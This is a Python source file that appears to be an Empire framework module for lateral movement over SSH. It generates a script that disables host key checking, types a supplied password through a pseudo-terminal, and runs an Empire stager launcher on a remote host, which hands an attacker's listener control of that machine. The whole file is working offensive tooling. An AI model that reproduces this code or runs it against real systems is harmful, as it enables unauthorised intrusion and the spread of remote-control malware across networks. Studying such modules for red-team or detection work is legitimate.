from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common.module_models import PydanticModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        login = params['Login']
        password = params['Password']
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        safe_checks = params['SafeChecks']

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)
        launcher = launcher.replace("'", "\\'")
        launcher = launcher.replace('"', '\\"')
        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")
        script = """
import os
import pty

def wall(host, pw):
    import os,pty
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '%s'])
        os._exit(1)

    os.read(fd, 1024)
    os.write(fd, '\\n' + pw + '\\n')

    result = []
    while True:
        try:
            data = os.read(fd, 1024)
            if data[:8] == "Password" and data[-1:] == ":":
                os.write(fd, pw + '\\n')

        except OSError:
            break
        if not data:
            break
        result.append(data)
    pid, status = os.waitpid(pid, 0)
    return status, ''.join(result)

status, output = wall('%s','%s')
print(status)
print(output)

""" % (launcher, login, password)

        return script
